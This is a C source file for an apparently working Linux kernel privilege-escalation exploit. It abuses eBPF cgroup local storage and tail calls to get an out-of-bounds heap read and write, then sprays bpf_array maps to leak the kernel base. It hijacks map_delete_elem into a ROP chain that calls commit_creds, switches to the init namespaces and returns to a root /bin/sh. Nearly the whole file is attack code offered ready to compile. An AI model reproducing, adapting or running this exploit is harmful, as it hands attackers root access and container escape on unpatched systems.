#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include "bpf_defs.h"
#include "exploit_configs.h"
#include "kernel_defs.h"

#define ARRAY_MAP_OPS_OFFSET 0x3ff0
#define HEAP_SPRAY_SIZE 0x100
#define CGROUP_STORAGE_SIZE_SMALL 0x3f00
#define CGROUP_STORAGE_SIZE_BIG 0xf000
#define ARRAY_STORAGE_SIZE 0x1000
#define TEST_RUN_DATA_SIZE 0x100

unsigned long user_cs,user_ss,user_rsp,user_rflags;

void shell(void) {
        printf("ret2usr success! uid : %d\n",getuid());
        char *args[] = {"/bin/sh", "-i", NULL};
        execve(args[0], args, NULL);
}

static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp),"=r" (user_rflags) : : "memory");
}


int create_bpf_maps(exploit_context* pCtx)
{
    int ret = -1;
    int prog_array_map = -1;
    int data_array_map = -1;
    int cgroup_map0 = -1;
    int cgroup_map1 = -1;
    union bpf_attr prog_array_map_attrs =
    {
        .map_type = BPF_MAP_TYPE_PROG_ARRAY,
        .key_size = 4,
        .value_size = 4,
        .max_entries = 0x10,
    };

    prog_array_map = create_map(&prog_array_map_attrs);
    if( prog_array_map < 0){
        printf("[-] failed to create prog_array_map!\n");
        goto done;
    }

    union bpf_attr cgroup_storage_small_map_attrs =
    {
        .map_type = BPF_MAP_TYPE_CGROUP_STORAGE,
        .key_size = 8,
        .value_size = CGROUP_STORAGE_SIZE_SMALL,
    };

    cgroup_map0 = create_map(&cgroup_storage_small_map_attrs);
    if( cgroup_map0 < 0){
        printf("[-] failed to create cgroup_map0!\n");
        goto done;
    }

    union bpf_attr cgroup_storage_big_map_attrs =
    {
        .map_type = BPF_MAP_TYPE_CGROUP_STORAGE,
        .key_size = 8,
        .value_size = CGROUP_STORAGE_SIZE_BIG,
    };

    cgroup_map1 = create_map(&cgroup_storage_big_map_attrs);
    if( cgroup_map1 < 0){
        printf("[-] failed to create cgroup_map1!\n");
        goto done;
    }


    union bpf_attr data_array_map_attrs =
    {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = ARRAY_STORAGE_SIZE,
        .max_entries = 1,
    };

    data_array_map = create_map(&data_array_map_attrs);
    if( data_array_map < 0){
        printf("[-] failed to create data_array_map!\n");
        goto done;
    }

    pCtx->prog_array_map = prog_array_map;
    pCtx->cgroup_map0 = cgroup_map0;
    pCtx->cgroup_map1 = cgroup_map1;
    pCtx->data_array_map = data_array_map;
    ret = 0;
    
done:
    printf("create map success\n");
    return ret;
}

//Here is the prog which will do heap overflow write to the heap which created in  bpf_test_run -> bpf_cgroup_storage_alloc
int load_prog_do_oob_read_write(exploit_context* pCtx){
    int prog_fd_do_oob_read_write = -1;
    char verifier_log_buff[0x200000] = {0};
    struct bpf_insn insn_do_oob_read_write[] =
    {
	BPF_LD_MAP_FD(BPF_REG_1, pCtx->cgroup_map1),
        BPF_MOV64_IMM(BPF_REG_2, 0), //BPF_CGROUP_STORAGE_SHARED
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_get_local_storage),
	//Now we get the heap created in  bpf_test_run -> bpf_cgroup_storage_alloc.
	//We try to do oob read to confirm if the next heap is a 'struct bpf_array' 
	BPF_LDX_MEM(BPF_H, BPF_REG_1, BPF_REG_0, ARRAY_MAP_OPS_OFFSET),//Read 'struct bpf_array . map . ops' low 2 bytes
	BPF_JMP_IMM(BPF_JEQ, BPF_REG_1, ARRAY_MAP_OPS_OFF&0xffff, 2), //Check if the next heap is a 'struct bpf_array'
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

	BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, ARRAY_MAP_OPS_OFFSET),//Get map -> ops, the address of array_map_ops; Get the offset from debugging
        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, ARRAY_MAP_OPS_OFFSET+0xc0), //Get map ->rcu list. It is a two-way pointer pointing to itself. We will use it later. 0xc0 == offset(map, rcu);
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x50),//Get bpf_array->value address. We put the map->ops here.
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_2, ARRAY_MAP_OPS_OFFSET), //Overwrite map->ops to bpf_array->value.
        BPF_LD_IMM64(BPF_REG_3, ARRAY_MAP_OPS_OFF),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_1, BPF_REG_3), //calculate off to bypass ASLR
        BPF_LD_IMM64(BPF_REG_3, POP_RBX_RET),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_1), //calculate first gadget address

        //Now overwrite map->ops->map_delete_elem
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_3, ARRAY_MAP_OPS_OFFSET+0x110+0x70), //0x110 = offset(bpf_array, value), 0x70 = offset(bpf_map_ops, map_delete)
	//Next, we try to store th kernel off at data_array_map
	BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),
	//Get the map_value of data_array_map
	BPF_LD_MAP_FD(BPF_REG_1, pCtx->data_array_map),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, -0x10),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x10),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
	BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),//Store the kernel off at &data_array_map->value[0]
	BPF_MOV64_IMM(BPF_REG_1, 1),
	BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 8),//Store 1 at &data_array_map->value[8] to mark we have written the map->ops->map_delete_elem
	BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };


    union bpf_attr prog_do_oob_read_write_attrs =
    {
        .prog_type = BPF_PROG_TYPE_CGROUP_SKB,
        .insn_cnt = sizeof(insn_do_oob_read_write) / sizeof(insn_do_oob_read_write[0]),
        .insns = (uint64_t)insn_do_oob_read_write,
        .license = (uint64_t)"",
        .log_level = 2,
        .log_size = sizeof(verifier_log_buff),
        .log_buf = (uint64_t)verifier_log_buff
    };
    prog_fd_do_oob_read_write = bpf(BPF_PROG_LOAD, &prog_do_oob_read_write_attrs);
    if(0 > prog_fd_do_oob_read_write)
    {
        puts(verifier_log_buff);
    }

    int ret = update_map_element(pCtx->prog_array_map, 0, &prog_fd_do_oob_read_write, 0);
    if(ret<0){
        printf("Fail to update map array");
        return;
    }
}


void test_run(int prog_fd){
    int ret = -1;
    char * data_in = malloc(TEST_RUN_DATA_SIZE);
    memset(data_in, 0x41, TEST_RUN_DATA_SIZE);
    union bpf_attr attr =
    {
    };
    attr.test.prog_fd = prog_fd;
    attr.test.data_size_in = TEST_RUN_DATA_SIZE;//any size is OK
    attr.test.data_size_out = TEST_RUN_DATA_SIZE;
    attr.test.data_in = data_in;
    attr.test.data_out = data_in;
    ret = bpf(BPF_PROG_TEST_RUN, &attr);
    if(ret < 0){
    	printf("test run fail : %d\n", ret);
    }
}

void rop_on_stack_and_hijack_rip(int fd, uint64_t kernel_off, exploit_context* pCtx){
    struct bpf_insn insn[] =
    {
        //Pad stack
        BPF_LD_IMM64(BPF_REG_0, kernel_off + POP_RDI_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0xa8),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + INIT_CRED),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0xa0),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + COMMIT_CREDS),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x98),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + POP_RDI_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x90),
        BPF_LD_IMM64(BPF_REG_0, 1),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x88),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + FIND_TASK_BY_VPID),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x80),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + MOV_RDI_RAX_POP_RBX_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x78),
        BPF_LD_IMM64(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x70),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + POP_RSI_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x68),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + INIT_NSPROXY),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x60),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + SWITCH_TASK_NAMESPACES),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x58),
        
	BPF_LD_IMM64(BPF_REG_0, kernel_off + SWAGPGS_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x50),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + IRETQ),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x48),
        BPF_LD_IMM64(BPF_REG_0, (uint64_t)shell),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x40),
        BPF_LD_IMM64(BPF_REG_0, user_cs),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x38),
        BPF_LD_IMM64(BPF_REG_0, user_rflags),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x30),
        BPF_LD_IMM64(BPF_REG_0, user_rsp|8),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x28),
        BPF_LD_IMM64(BPF_REG_0, user_ss),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x20),
        //Jmp to gadget
        //Now we jmp to map->ops->map_update_elem
        BPF_LD_MAP_FD(BPF_REG_1, fd),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, -0x10),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x10),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_delete_elem),
        //Exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL))
    {
        printf("[-] failed to run eBPF program!\n");
        exit(0);
    }
}

//Load and run the prog which call tail_call
void load_and_run_prog_do_tail_call(exploit_context* pCtx){
    int prog_fd_do_tail_call = -1;
    char verifier_log_buff[0x200000] = {0};
    struct bpf_insn insn_do_tail_call[] =
    {
	BPF_LD_MAP_FD(BPF_REG_2, pCtx->cgroup_map0), //here will call bpf_cgroup_storage_assign
	BPF_LD_MAP_FD(BPF_REG_2, pCtx->prog_array_map),
	BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_tail_call),//here will call program B
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

    };


    union bpf_attr prog_do_tail_call_attrs =
    {
        .prog_type = BPF_PROG_TYPE_CGROUP_SKB,
        .insn_cnt = sizeof(insn_do_tail_call) / sizeof(insn_do_tail_call[0]),
        .insns = (uint64_t)insn_do_tail_call,
        .license = (uint64_t)"",
        .log_level = 2,
        .log_size = sizeof(verifier_log_buff),
        .log_buf = (uint64_t)verifier_log_buff
    };
    prog_fd_do_tail_call = bpf(BPF_PROG_LOAD, &prog_do_tail_call_attrs);
    if(0 > prog_fd_do_tail_call)
    {
        puts(verifier_log_buff);
    }
    //Before run the prog, do heap fengshui
    //Create many 'struct bpf_array', which will use kmalloc-1k
    int heap_spray_array_map_list[HEAP_SPRAY_SIZE];
    union bpf_attr heap_spray_map_attrs =
    {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = 0x3e00, //When the value size of array map is 0x3e00, the memory size it allocates and the memory size ultimately created through bpf_cgroup_storage_assign using cgroup map created with CGROUP_STORAGE_SIZE_SMALL will result in the same number of pages being allocated using kmalloc.
        .max_entries = 1,
    };
    for(int i=0;i<HEAP_SPRAY_SIZE;i++){
	   heap_spray_array_map_list[i] = create_map(&heap_spray_map_attrs);
    }
    //Delete some of them, We hope that 'bpf_test_run->bpf_cgroup_storage_alloc' can get back the released heap memory
    for(int i=0;i<HEAP_SPRAY_SIZE;i++){
    	if(i%2==0)
		close(heap_spray_array_map_list[i]);
    }
    char *data = malloc(0x1000);
    memset(data, 0, 0x1000);
    while(1){
    	test_run(prog_fd_do_tail_call);
	lookup_map_element(pCtx->data_array_map, 0, data);
	if(*(uint64_t *)(&data[8]) == 1)//It means we do heap fengshui success
		break;
    }
    uint64_t kernel_off = *(uint64_t *)(&data[0]);
    printf("get kernel_off : %llx\n",kernel_off);
    
    for(int i=0;i<HEAP_SPRAY_SIZE;i++){
    	if(i%2==0)
		continue;
	rop_on_stack_and_hijack_rip(heap_spray_array_map_list[i], kernel_off, pCtx);
    }
    
}



int main(int argc, char **argv)
{
    save_state();
    exploit_context ctx = {0};
    
    if(0 != create_bpf_maps(&ctx))
    {
        printf("[-] failed to create bpf maps!\n");
        goto done;
    }
    
    load_prog_do_oob_read_write(&ctx);
    load_and_run_prog_do_tail_call(&ctx);
done:
    return 0;
}
